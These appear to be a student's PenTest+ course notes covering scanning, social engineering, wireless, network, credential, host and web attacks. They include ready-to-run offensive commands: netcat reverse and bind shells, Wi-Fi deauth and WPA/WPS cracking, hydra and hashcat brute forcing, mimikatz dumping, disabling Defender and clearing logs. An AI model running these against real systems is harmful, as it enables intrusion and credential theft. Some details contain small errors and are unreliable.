# Udemy CompTIA PenTest+ notes (Jason Dion)
 <img src="https://whop.com/blog/content/images/size/w600/2024/05/What-is-Udemy-Pros--Cons--and-Features-2024-Review.webp" alt="udemy pic" width="900" height="500"> 

- https://www.udemy.com/course/pentestplus

## Section 1: Introduction
## Section 2: Pentesting Overview
## Section 3: Pre-Engagement Activities
## Section 4: Frameworks
## Section 5: Information Gathering
## Section 6: Open-Source Intelligence OSINT
## Section 7: Scanning and Enumeration
## Section 8: Recon and Enumeration Tools
## Section 9: Nmap and NSE
## Section 10: Scripting Basics
## Section 11: Modifying Scripts
### Section Overview
- bash fundamentals
- understanding a bash script
- modifying a bash script
- powershell fundamentals
- understanding a powershell script
- modifying a powershell script
- python fundamentals
- understanding a python script
- modifying a python script
### Bash
    #!/bin/bash
    #hashtag are comments in bash
    variable=value
    CustomerName=David
    $CustomerName
    declare option VariableName=value 
    tempArray=(value1, value2, value3)
- Command-line scripting language used for command shell inside Unix-like systems(Linux & macOS)
### string comparison
    #single equal and double equal are the same
    if [ "$a"="$b" ]
    if [ "$a"=="$b" ]
    #not equal to each other with !
    if [ "$a" != "$b" ]
    is less than or greater than
    if [ "$a" \> "$b" ]
### simple counting script
    for value in {1..5}
    do
    echo $value
    done

    echo "all done"
### while do done script
    while [ <some test> ]
    do 
     <commands>
    done
    #until do done script is similar
### simple echo script
    echo "Please enter your name:"
    read UserName
    echo "Hello $UserName!"
### Input/Output to file
    TempFile=$(<test.txt)
    echo "$TempFile"
    #< inputs to file > output to file
### Network_bash_script
    #!/bin/bash
    echo "Pulling NetworkManager entries..."
    grep "NetworkManager" /var/log/syslog | cut -d " " -f1-5 > netman-log.txt
    echo "NetworkManager log file created!"
    #print, search, and save

### Network_bash_script
    #!/bin/bash

    #Simple Ping sweep script
    #Usage: ./ping_sweep.sh 192.168.1

    if ["$1" -- ""]
    then
     echo "Usage: $0 <network-prefix>"
     echo "Example: $0 192.168.1"
     exit
    fi

    network=$1

    echo "Starting ping sweep on network $network.0/24..."

    for ip in $(seq 1 254); do
     ping -c 1 -w 1 $network.$ip > /dev/null 2>&1
     if [ $? -eq 0 ]; then 
      echo "Host $network.$ip is up"
    fi
    done

    echo "Ping sweep completed."
### comments
    <#
    this is a commment block 
    #>
### if then code
    if ()
     {#then this}
## Powershell

#### Retrieve logon failures script
      Write-Host "retrieving logon failures..."
      Get-EventLog -Newest 5 -LogName Security -InstanceID 4625 | select
      timewritten, message | Out-File C:\log-fail.txt
      Write-Host "Log log-fail.txt has been created."

### Python
String 
- Vender = "CompTIA"
- Price = int(42)
Array
- tempArray
  dictionary
  - PhoneBook = {}
  if then
-if  a == b:
    - print xyz
 ### write to a file in pythong
    tmepFile = open('test.txt', 'w') 
    #write will overwrite any existing content
    
#### 

## Section 12: Analyzing Scans
### True positive
- Occurs when the testing correctly identifies a vulnerability or threat that is actually present.

### True Negative
- Occurs when the testing correctly identifies that NO vulnerability or threat is present.

### False Positive
- Occurs when the testing indicates a vulnerability or threat but in reality none exists.

### False Negative
- Occurs when the testing fails to detect a vulnerability or threat that actually exists.
- THE MOST DANGEROUS ONE because provides a false sense of security.

True positive and and True Negative
- Indicate accurate results from testing.

False positives and False Negatives
- Represent erros that need careful management.

### Validating Scan results
- Verify results of scan
- Validate domain names, IP addresses, etc
- validate enumeration results (user account details from nmap, netcat, enumeration scripts)

### CVEs and CVSS
- Common Vulnerabilities and Exposures and Common Vulnerability Scoring System
- CVEs are known vulnerabilities CVSS is a scoring system used to evaluate thos vulnerabilities.
- EPSS (Exploit prediction scoring system)

### Target Prioritization
- identify high value asset (customer relation databases, etc)
- recognizing end-of-life software and systems
- understanding the risks posed by default configurations, credentials,

### Common Target Criteria
- Running Services
- Vulnerable encryption methods
- Defensive Capabilities

### Scan validations
- Nikto (scans for web application vulnerabilities)
- Nessus (scans for network vulnerabilities)

### Tool Selection
- nmap
- nessus
- nikto
- burp suite
- owasp zap
- Network diagrams (microsoft visio, draw.io, hand-drawn scetches)


## Section 13: Discovering Vulnerabilities
Overview
- Applicaiton Scanning
- Software Analysis
- Host-based Scanning
- Network Scanning
- Mobile Scanning
- Container Scanning
- Scanning IaC
- ICS Vulnerability Discovery
- Wirelesss Scans
- Static code Analysis(SonarQube)

### Application Scanning 
- involves using tools and techniques to identify security vulnerabilities in software applications
- Can be diveded into static and dynamic scanning 
- DAST (Dynamic Application Security Testing)
- IAST (Interactive Application Security Testing)

### Software Analysis
- provides visibility
- complies with open source licenses
- Primarily focuses on known vulnerabilities
- SAST(Static Application Security Testing)
 - buffer overflows
 - SQL injection
 - Cross-site Scripting vulnerabilities

### Host-based scanning
- Authenticated Scans have creds (Nessus Qualys)
- Unauthenticated Scans no creds(Open ports, running services, visible vulnerabilities)
- Secrets Scanning (Searching for exposed sensitive info like passwords, API keys, encryption keys)

### Network Scanning
- TCP/UDP scanning
- Stealth scan
- port scan
- TCP scan is the most common scan (3 way handshake)
- SYN scan (fastest and stealthiest scan)
- Full connect scan (can provide more detailed info but also more likely to be detected)
- Fin Scan (a type of stealth scan)
- UDP scan (sends udp packet and anaylzes the responses
- Null Scan (eploits how different OSs respond to unusual TCP packets)
- Idle/zombie scan (Uses a third party system to send packets to target)

### Mobile Scanning
- Using tools and techniques to analyze mobile apps and devices to identify security vulnerabilities, misconfigurations and threats.
- SAST scanning (Static)
- DAST scanning (Dynamic) burpe suite
- 
### Container Scanning (in Kali)
    sudo apt install trivy
    docker pull nginx:1.19
    sudo !!
    sudo docker pull nginx:1.19
    trivy image nginx:1.19
    #trivy scan

### Scanning IaC (Infrastructure as a Code)
- CloudFormation Guard (AWS tool to define and enforce rules)
- Policy-as-Code (Automatically applied policy)
- CI/CD (Continuous Integration/continuous Deployment
- Terraform
- AWS Config
- drift detection

### ICS (Industrial Control Systems) Vulnerability Scanning
- includes PLCs(Programmable Logic Controllers), HMIs(Human-Machine Interfaces), and RTUs(Remote Terminal Units)
- traffic mirroring (can reveal malicious activity and analyzed using wireshark or Tcpdump)

### Wireless attacks
- SSID scanning (tools such as Kismet and Wireshark)

### Static Code Analysis (SonarQube)
- Used for code analysis

## Section 14: Vulnerability Discovery Tools
### Vulnerability Discovery tools
- Used to find weaknesses in network
- Nikto (Network scanner)
- OpenVAS (Vuln scanner)
- Trivy (Vuln in containers)
- BloodHound (AD vuln scanner)
- PowerSploit (Powershell automation scanner)
- Grype (Vuln scanner for container imgages and files sytems)
- Kube-hunter (Scanner for Kubernetes clusters)
- TruffleHog (scanner for repositories that looks for creds)




## Section 15: Social Engineering Attacks
- Mix of psychological tricks to trick user
- Methods of influence
- Phishing campaigns
- Using the Social Engineering Toolkit (SET)
- Gophish
- Impersonation
- Surveillance Techniques
- Watering Hole
- Evilginx
- Tailgating and Piggybacking
- Browser Exploitation Framework

#### Methods of influence
  1. Authority___________pretending to be boss, gov authority, financial institution
  2. Urgency_____________Pretending to be in a rush, hold the door please, phone call with urgency
  3. Social Proof________More likely to click on things with more likes and shares online
  4. Scarcity____________Only so much of something, hurry up and sign up for my website or buy something before it's out of stock.
  5. Likeness/Likability_People want to interact or be with someone they like and trust. Friendly, pretty, charismatic.
  6. Fear_______________Pop up virus saying you need to click or you will be arrested or your files will be encrypted.

#### Phishing Campaigns
- phishing send fraudulant emails asking to click on link to update bank info, ect.
- spearphisihing specially crafted and sent to specific individuals
- Whaling Targetting high-profile individuals
- Business email compromise (BEC) attacker gaining access to a legit business email account to conduct unauthorized transfer of funds or sensitive info
- Vishing phone call to trick an individual into divulging personal info
- Smishing SMS phishing uses texts from seeminly legit sources getting the user to click on a link

### Social Engineering Toolkit
### Gophish
- tool that allows creation and management of phishing campaigns that simulate real-world phishing attacks

### Impersonation
- On ebay you can buy uniforms like UPS or Amazon delivery uniforms

### Surveillance Techniques
- survelillance
- eavesdropping
- shoulder surfing
- dumpster diving

### Watering Hole
- Involves the attacker identifyinga website or online platform that is frequently visited by members of a group or organization
- Goal is to infect the site with malware
- Can be defended against by using a multilayered approach (up to date software, web filters, advanced threat detection tools, educate employees)

### Evilginx
- tool for phishing attacks that can bypass MFA

### Tailgating
- Someone sneaks into a secure space behind an authorized individual

### Piggybacking 
- similar but employee with access knowingly allows unauthorized person to enter

### Preventative measures
- Mantraps
- Security personnel and cameras
- Employee training
### Browser Exploitation Framework (BeEF)
- exploit vulnerabilities in web browsers
- First step is to hook the target's browser by getting victim to visit malicious website that executes some javascript
   - Once the target is hooked they can be controlled regardless of network
   - examples is using XSS attack
   - BeEF is compatible with Windows, Linux and MACOSX

 
## Section 16: Wireless Attacks
- Wireless Security
- Wireless signal exploitation
- Aircrack-ng
- Wireless Hacking
- WPS PIN attacks
- Captive Portal Attacks
- Evil Twin
- Kismet
- Wifi Protocol Fuzzing

### Wireless security
- Most wireless schemes use a pre-shared key(encrypt and decrypt the data)
- Encryption (WEP, WPA, WPA2, WPA3)
   - Open, no encyption
   - Wireless Equivilant Protection, weakness is the 24-bit Initialization Vector
   - Wifi Protected Access replaced WEP, uses RC4 and MIC for added security
   - WPA2 introduced stronger encryption with CCMP and AES (128bit key)
   - WPA3 stronger encryption uses SAE(Simultaneous Authentication of Equals) prevents offline attacks and conducts Perfect forward Secrecy. Session keys cannot be comprimised. Dragonlfy
- Macfiltering is useless


### Wireless signal exploitation
- inSSIDer-  wifi scanning tool that helps you visualize
- signal jamming- the act of disrupting wireless communication by overwhelming the frequency with noise or signal
- Wardriving- searching for wifi networks by moving around geographic area, typically in a vehicle.
   - wigle.net- maps wifi networks, can search density and security on a map
   - 
### Wireless hacking Aircrack-ng
- gather handshack packets or IV(initialization vectors)
- Type of DOS(denial of service) attack, specifically targeted at wireless networks, forces client to disconnect by sending spoofed deauth frames
1. Put wireless card in monitor mode ```airmon-ng start wlan0```
2. next use ```airodump-ng wlan0mon``` to scan/monitor networks to save to pcap file
3. capture traffic from the target taking note of BSSID, MAC address and channel. example is ```airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon```
4. perform the deauth attack to force client to reconnect ```aireplay-ng -deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon```
5. Crack the WPA/WPA2 key by using a dictionary attack to guess the passphrase. Example is using rockyou.txt or a specifically designed wordlist.txt ```aircrack-ng -w /path/tp/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap```
#### Practical
    iwconfig 
    airmon-ng start wlan0    #put wifi card in monitor mode
    iwconfig 
    airodump-ng wlan0mon     #monitors network access points and copy it
    airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write Wirelesshackingcapture wlan0mon #waiting for device to connect to capture it
    aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon #force target device to disconnect then reconnect to capture encrypted passphrase/handshake
    ls #we now see that Wirelesshackingcapture.cap file
    aircrack-ng Wirelesshackingcapture.cap -w /usr/share/wordlists/rockyou.txt #cracking password with this command

### WPS PIN Attack
- Wife Protected Setup (WPS) button to quick connect devices 8 digit pin seperated by 4 and 4.
- To crack a 4 digit pin it is only 10,000 possible pins.
- 3 digit is only 1,000 possible pins
#### Practical
    iwconfig
    airmon-ng start wlan0 #switch wifi card to monitor mode
    wash -h
    wash -i wlan-mon #start scanning networks
    clear
    reaver -h #used to brute force the WPS pin
    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1 #will brute force the WPS pin
    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -N #-N is the no NAT flag, depending on router you have to adjust the flags
    wash -i wlan0mon
    bully -b AA:BB:CC:DD:EE:FF -p 1234567 wlan0mon


### Captive Portal Attacks
- Used in Public wifi like coffee shops, redirects to a portal to login
- Exploit the mechanism- could be vulnerable to XSS, SQL injection, or improper session handling
- Inject malicious content
- Gain unauthorized access
- Evil twin attack- set up rogue access point to look like the official one
-  Defense
   - Secure Network Configuration
   - Software Maintenance
   - Security Assessments
   - User Education

###  Evil twin attack- set up rogue access point to look like the official one
- allows attacker to intercept and manipulate traffic
- Wifi Pumpkin- powerful framework written in Python that helps  create a fake access point

### Kismet
- Is open-source sniffer, wireless Intrusion detection system, wardriver, packet capture tool
- Used during reconnaissance phase of pentesting
- Can detect hidden SSIDs that attempt to obscure their presence
- Packet logging and analysis
- Multifuctional support- can detect bluetooth, zigbee networks and other wireless protocols as well

### Wifi Protocol Fuzzing
- Technique used to identify vulnerabilities in wifi by sending random data to wireless devices and observing their behavior
- Uses malformed packets to send to wifi devices
- Frame Check Sequence (FCS)- can manipulate this 
- Send frame with wrong MAC address
- Common tools are Scapy and Wireshark

## Section 17: Network Attacks
### Overview
- Network Attacks (4.0 Attacks and Exploits)
- Stress Testing
- Bypassing segmentation
- MAC Spoofing
- NAC Bypass
- Session based attacks
- Service Exploitation
- Packet Crafting
- Netcat
- Using Netcat
- Default Network Credentials
- LLMNR/NBT-NS Poisoning
- ARP Poisoning
- Intro to Metasploit

### Stress Testing
- Software testing method that evaluates how a system behaves under load (evaluates limits)
- processors, memory, network, storage
- To do this you can create a python script, download open source tools, use (LoadView, LoadNinja, Loader)
- Packet Storm- Any large increase in network traffic that's directed at a given target

### Bypassing segmentation
- techniques used to circumbent network segmentation controls
- VLAN hopping
    - switch spoofing
    - double tagging- sends packet with 2 vlan tags 
- Multihomed host- device that has multiple network interfaces connected to different networks
- nmap

### MAC Spoofing
- AA:BB:CC:DD:EE:FF
- Layer 2 devices uses MAC addresses and associate with CAM table
- Can use Allowlist and blocklist to filter MAC addresses, but can be bypassed by changing MAC address of wifi card
- ```ifconfig```
- ```macchanger -r wlan0mon```
- ```macchanger -h```
- ```macchanger -m AA:BB:CC:DD:EE:FF wlan0mon```
### NAC(Network Access Control) Bypass
- Antivirus updates, os patches, security services
- Agents(Persistant, NON-persistant, volitle)
- Agentless(volitle) NAC solution- installs scanning tool on domain controller
- bypass by 1. exploit authorized host 2. make device look like something else

### Session Based Attacks
- On-path attack- pentester puts their workstation logically between two hosts during the communication
   - Arp poisoning
   - DNS poisoning
   - Rogue wifi access point
   - Rogue hub or switch
- Replay Attack- capture authentication and replay it
- Relay- attacker becomes apart of the host(get info then pass it on)
- SSL stripping- attacker tricks the encryption app into presenting the HTTP connection instead of HTTPS
- Downgrade Attack- Attacker attempts to have client or server abandon a higher security mode in favor for a lower mode


### Service Exploitation
- Certificate Services- target weak cert authority
   - MD5 is outdated encryption, should be updated to SHA256
- look for default settings and directories
- Share enumeration- involves things shared on network like folders and printers
- smbclient to enumerate clients on target machine

###Packet Crafting
- involves creating custom network packets to test devices, simulate attacks, or explore vulnerabilities
- tools like scapy, hping, and Impacket are used
- smb attack
- LDAP relay attack
- scapy packet crafting

### Netcat(nc)
- command line utility for reading and writing raw data over a network connection
- Remote shell connection (bind or reverse shell)
- bind shell is a listening port on victim machine
    - set up listener  ```nc -l p 443 -e cmd.exe```
    - connect to listener bind shell ```nc 10.10.10.10 443```
 -Reverse shell set up from Attacker pc
     - ```nc -l -p 443```
     - ```nc 10.10.10.10 443 -e cmd.exe```
### Using Netcat(nc)

### Default Credentials
- preconfigured usernames and passwords
- common target for attackers
- examples are routers, printers, databases, SQL server, web applications
- tools include hydra and medusa (brute force attacks)

### LinkLocal Multicast Name Resolution (LLMNR)
- DNS or name resolution if on the same Network
- Netbios Name Service (NBNS or NBT-NS)-
- Responder

### ARP(Address Resolution Proocol) Poisining
- change MAC and IP in Arp table
- msfconsole
- 
### Metasploit
- open-source penetration framework with built in exploits
- msfvenom can generate payloads

## Section 18: Authentication Attacks 4.2 4.3 4.5
### Overview
- Types of Password Attacks
- Password Cracking tools
- Credential Attacks
  - Password Spraying
  - Password Masking Attacks
- Credential Passing Attacks
  - Multifactor Authentication
- Directory Service Attacks
- CrackMapExec
- SAML Attacks
- OpenID connect Attacks
- Hash Attacks

### Types of Password Attacks
- Brute Force Attacks- basic attack trying every possible combination
  - tools include hydra and John the Ripper
  - ```hydra -l jkelly -x 4:8 abcdefghijklmnopqrstuvwxyz1234567890 ssh://192.168.1.100```
- Dictionary Attack- uses a predifined list like John the ripper  ```john -- wordlist=/usr/share/wordlist/rockyou.txt -- rules --format=raw-md5 hash_file```
- Hybrid attacks-combine both brute force and dictionary attacks
- Rainbow Table attack- uses a table of hashed passwords and their corresponding plaintext passwords to crack password hashes quickly. Can use hashcat

### Password Cracking tools
- Hashcat 
- John the Ripper
- Hydra
- Medusa

Example of cracking a hash
- head /usr/share/wordlists/rockyou.txt
- ```echo -n "abc123" | md5sum | awk '{print}' > hash.txt``` create hash of abc123
- ```hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt```
- ```john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
- ```hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.0```
- ```medusa -h 127.0.0.1 -u ftpuser -P /usr/share/wordlists/rockyou.txt -M ftp```

### Credential Attacks
- Password Spraying- tries common passwords across many accounts. Tool used is CrackMapExec
- Password Masking- Creates a password that follows patterns or rules used to guess other passwords. Tool used is Hashcat
- Credential Stuffing- uses perviously breached username and password pair to gain unauthorized access. Tool used is Hydra
   - protect against this by using MFA, monitor for login attempts, Encourage unique passwords
- MFA Fatigue- user gets overwhelmed with authentication prompts

### Credential Passing Attacks
- Pass-the-Hash attack -allow an attacker to authenticate to a remote server or service by using the hashed value of a users password. ```mimikatz # sekurlsa::logonpasswords```
- Pass-the-ticket Attack -attacker uses stolen kerberos tickets. mimiktatz -k -no-pass DOMAIN/user@IP
- Pass-the-Token Attack -uses stolen authentication token for unauthorized access

### Directory Service Attacks
- Kerberos attacks -kerberoasting attack
- LDAP attacks -LDAP protocol is used to maintain directory info. Attacker can inject code to get directory info
- CrackMapExec -Post-exploitation tool used to automate various tasks in a windwos environment

### CrackMapExec(CME)
- used in attacks like pass the hash/ticket/credential stuffing
- old tool
- Rubeus is an alternative tool

### SAML Attacks
- Open standard for exchanging authentication and authorization data between parties
- user browser>service provider>identity provider
- SAML token Manipulation attack
   - XML based and contain assertions that can be manipulated
   - If an attacker captures the token they can escalate to admin or modify the token
- SAML replay attack -Can happen if attacker captures token
- SAML injection attack -exploit vul in SAML processing

### OpenID connect Attacks
- Identity layer built on layer 2
- SSO (single sign on)
- ID toekn manipulation -attacker modifies the ID token to gain unauthorized access
- protect against this by always validating signature and integrity of token
- ID token replay attack using wireshark
- ID token injection attack
- Webfinger service -helps identify user
- OpenID connect dynamic Client registration

### Hash Attacks
- collision attacks -2 inputs produce the same hash value. One type is birthday attack.
- ```hashcat```
- hashes store passwords so they are not stored in plaintext
- can further prevent passwords by salting
- key stretching increases security - Apply hash function multiple times

## Section 19: Host Attacks (4.4)

### Priviledge Escalation
- mimikatz(post exploit tool for extracting plaintext passwords, hashdumps, and kerberos tickets)
- vertical escalation(higher privs)
- horizontal escalation(accessing peer-level accounts)
- Seatbelt (C# tool that performs security checks on a system)
- Powershell (ISE) graphical interface of powershell to use scripts
  - Can use powershell to run services and run software
### Conducting Priviledge Escalation
    msfconsole
    use exploit /path
    set payload
    show options
    set RHOST victimIP
    set LHOST AttackerIP
    show options
    exploit
    getpid
    ps 
    getsid
    hashdump #get password hashes. Can crack using Johnny/John the Ripper/Crackstation.net
    migrate 1248 
    getpid
    getsid
    keyscan_start #start keylogger
    keyscan_dump

### Credential Harvesting/Dumping
- Harvesting- gathering creds through phishing attacks or social engineering techniques
- Dumping- post exploitation where attacker gets creds from compromised system
- mimikatz
- rubeus- kerberos ticket manipulation
- SID- secure identifier

### Misconfigured Endpoints
- Endpoints- devices that connect to the network to request services
- vulnerabilities include- can have weak passwords, unnecessary services running, open ports that should be closed
- Escalate with PowerShell
- explore the system, identify vulnerabilities, etc.
- PsExec- execute command using powershell from a remote connection

### Unquoted Service paths
- misconfiguration of path that can lead to malicious code execution
- windows has service paths defined in the registry. Example is C:\Program.exe

### diabling security software
- Can use powershell to disable firewall or Windows defender ```Stop-Service -Name "WinDefend" -Force``` ```Set-Service -Name "WinDefend" -StartupType Disabled
- Modify registry keys
- PSExec

### Payload Obfuscation
- Tools to do this include: Powershell, PsExec, EvilWinRM(pentest tool used to interact with WinRM)
- Payload
- obfuscation
- Encoding- changing payload appearance
- Encryption
- Compression
- Code Manipulation

### User Controlled Access Bypass
- Active Directory Certificate Services- manages certs used for authentication, encryption, and security
   - Certify- tool used to request domain admin privs
- Kerberos- used for authentication
   - Rubeus can be used to bypass it by getting Ticker-granting-ticket getting Golden ticket(master key)
- EvilWinRM-  remote execute commands on machine over HTTP using PowerShell

### Shell and Kiosk Escapes
- Shell Escape- breaking out of a restricted shell
- Kiosk escape- bypassing restrictions on public or kiosk systems to access full OS or unauthorized areas
- can escape from Vi, powershell ```Invoke-Expression -Command "cmd.exe"
- In windows use the "save as" to access the file explorer
- Use WMI

### Library and Process Injection
- DLL injection
- Process Hollowing
- EternalBlue- remote code execurtion with system level privs
- Can target svchost.exe. 
### Log Tampering
-  modifying logs to cover tracks and avoid detection
-  OS system, apps and network logs
-  Logs provide an audit trail
-  PowerShell can be used to clear Windows Event Logs ```Clear-EventLog```
-  PsExec
  
### Living off the Land
- bitsadmin.exe- commandline tool for managing Background Intelligent Transfer Service(BITS)
- Can use it to download malicious code from malicious server
- Regsvr32.exe
- schtasks- tool for managing scheduled tasks on windows
- certutil.exe- commandline utility used for managing certificates.
- Can be used to exfiltrate info

## Section 20: Web Application Vulnerability (4.3 and 4.5)
### Overview
- Race Conditions
- Buffer Overflows
- Buffer Overflow Attacks
- Authentication Flaws adn insecure references
- Improper Error Handling
- Improper Headers
- Code signing
- Vulnerable Components
- Software Composition
### Race conditions
- one execution process is directly dependent on the order and timing of certain events
-  Dereferencing- attack to remove the relationship between pointer and thing it's pointing to inside the memory
-  Dirty COW exploit- Linux os that exploited local priviledge escalation. No log to detect this
-  Time-of-Check to Time-of-Use(TOCTOU)- occurs when an app checks a resource and when the app uses the resource
  - protect against this by using locks and Mutex(Mutually exclusive flag)
  -  Deadlock- if a system crashes or doesn't complete properly

 ### Buffer Overflow
 - stores memory outside the memory range
 - same thing as overfilling a glass with water(it overflows)
 - Stack- reserved area of memory
 - "Smashing the Stack" filled up buffer
 - Non-Operation(NOP) Instruction tells system to do nothing and skip
#### Protect against with:
- buffer overflow by patch management
- secure coding practices(bounday checking and input validation)
- address space layout randomization(ASLR)
- data execution protection DEP(blocks apps that attempt to run from protected memory locations

- Integer overflow- operation is too large to fit into assigned variable type for storage
- Protect by using secure coding practices(bounday checking and input validation)

### Broken Authentication
- 4 digit pin can be cracked in 1,000 attempts
- session ID can be broken
- Protect by using multi factor auth, never use default creds, verify strong passwords, limit or delay to slow brute force attacks, server-side session, never pass session id as url, implement session timeouts

### Improper Error handling
- Use custom error handlers to prevent accidental leakage

### Improper Headers
- HSTS- HTTPS only
- HPKP- resist against impersonated fruadulent certs
- X Frame Options- filter in browser
- X Cross site scripting protection- prevent browser from interpreting files as something they are not
- X content type options- 
- Content security Policy- how browsers interpret pages
- X permitted Cross domain policies- sends cross domain policy to decide if client has permission
- Referrer Policy- which referrer policy should be included
- Expect-CT- Certificate transparency
- Feature-Policy- allow features like geolocation

### Code Signing
 - digitally sign code and script to verify authenticity of code
 - Example is 2020 SolarWinds attack. There was a backdoor in the source code. when they compilied and signed it was distributed to vendors with backdoor.

### Vulnerable Components
- REST(Representational State Transfer
- JSON(Javascript Object Notation)- inspect and sanitize
  - good for mobile devices
- SOAP(Simple Object Access Protocol)- Used for exchanging structural info for different web services
  - Passes more data. inspection and sanitation to prevent attacks
- Browser extension- Remove old plugins and extensions
- COM- allows software to communicate
- DCOM- allows software to be distributed
- Javascript
- HTML5- Hypertext Markup Language
- AJAX
- Machine Code- specific to a type of processor
- Bytecode- intermediate code executed by VM, then interpreted into machine code
- Java Applet

### Software Composition Analysis
- all code is subject to vulnerabilities
Issues can be:
- equifax 2017 hack- vulnerability in 3rd party java code CVE-2017-5638
- failed to patch and were hacked
- poor execution handling
- security misconfigurations
- weak cryptography implementation
- End of Life
- End of Support
- Code injection
- Regression Issues
- Regression Testing

## Section 21: Web Application Attacks (4.3 and 4.5)
### Overview
- Directory Traversal
- Directory Traversal tools
- Cross Site Scripting
- Request forgeries
- SQL injections
- Performing SQL injection attacks
- Injection attacks
- File inclusions
- Arbitrary code execution
- Web application session hijacking
- Abusing APIs
- OWASP ZAP
- Attacking Web applications
  
### Directory Traversal
- accessing files, directories and resources connected to a network through root directory
- Example var/www is where a web document might be
- linux uses forward slash /
- windows servers use back slash \
- Input validation and protect against directory traversal
- File Inclusion- executing a file or program from the URL
  - Remote file inclusion
  - local file inclusion- example is launching cmd.exe from the URL
##### ../ is most of the time directory traversal, but could also be local file inclusion

### Directory Traversal tools
- Gobuster- directory and file brute-forcing tool written in Go(programming language)
  - speed, it's fast
- DirBuster- Java based tool used to find and burte force hidden directories and files on a web server
#### Example
     dirbuster -h
     dirbuster #open GUI
     In GUI: put IP and port, Set number of threads(if you go too fast you can crash the server)
 - WPScan- tool specialized in scanning WordPress installations
### XXS Cross-Site Scripting
- Injects Malicious script into a trusted site to compromise the site's visitors
- attacks can deface trusted website, steal users data, intercept data, install malware on clients system
- non-persistant(happens once) and persistant(embedded)
#### For exam: log snippet or captured URL that have the script or any kind of javascript is going to be Cross-site Scripting Attack
### Request Forgery
- type of attack where an attacker tricks a victim into making unwanted request
- clickbait
- Anti-CSRF Tokens-create unique session included in every request
- Burp Suite
- Server-Side Request Forgery SSRF- tricks server into making requests to unintended locations
   - Example is the capital one cyber incident in 2019
- OWASP Zed attack Proxy (ZAP)- powerful tool for identifying and exploiting SSRF flaw
### SQL injection Attacks
- injects an SQL query through input form a client uses to send to server
- Example is putting ```'OR 1=1;'```
#### For exam you can prevent SQL injection by Input validation and Web Application firewall 
#### how to fix is Input validation

### Injection Attacks
- an attack that sends malicious data to an application, which is processed as part of a command or query
- Command Injection
- Server-side Template Injection
- XML injection
  
### File Inclusions
- file inclusion attacks- application includes files on the server and is included on the file path
- Remote File Inclusion RFI- Occurs when an application is included from ext source
- Local file inclusion LFI- application includes local server for file validation
- Mitigate by validate, whitelist, and implement secure coding practices

### Arbitrary Code Execution
- Critical vulnerability that allows attacker to run malicious code on target system
- Deserialization- converting data from a stored format, like JSON, back into an object that an application can use
- attacks can be used by injecting malicious objects
- Web Shell- script that allows attacker to execute commands on web server through a web interface
   - Attackers can exfiltrate data
   - pivot to other systems
   - Maintain persistant access

### Web Application Session Hijacking
- attacker can exploiit a browser vulnerability to steal your cookies
- Methods: Session fixation(use a known session ID) Prevent: get new session ID every time you log in
- session replay(repeats login session using XSS) type of MITM Prevent: always validate and sanitize user inputs
- Cross-site scripting(
-Protect:
   - Ensure secure flag for HTTPS on cookies
   - Session timeout
   - Reauthenticate after some actions
   - analyze logs
 
### Abusing API
- API Abuse- attacker exploits functionality of an API in ways developers did not intend or anticipate
- Attackers can use Burp Suite and Postman as tools
- JSON Web Token JWT- stateless(server does not need to store session info)
   - JWT manipulation
   - CVE 2015 2951
   - Prevent: secure hashing algo HS256 RS256, validate tokens signature, set short times on tokens, rotate keys
- Postman- collaboration for API development
- REST, SOAP, API

### OWASP ZAP
- open source tool designed to help pentesters to identify web application vulnerabilities
- ZAP works as a proxy between browser and web application
- passive(browse website without sending any info to website) vs active
- Automated quick scan
- HUD shows live alerts
- continuous integration

#### Attacking Web Applications
- Nikto
 
## Section 22: Cloud Attacks
## Section 23: Attacking Specialized Systems
## Section 24: Automated Attacks
## Section 25: Persistence
## Section 26: Lateral Movement
## Section 27: Exfiltration
## Section 28: Cleanup and Restoration
## Section 29: Remediation Recommendations
## Section 30: Penetration Test Reporting
## Section 31: Conclusion
## Section 32 Practice Exam
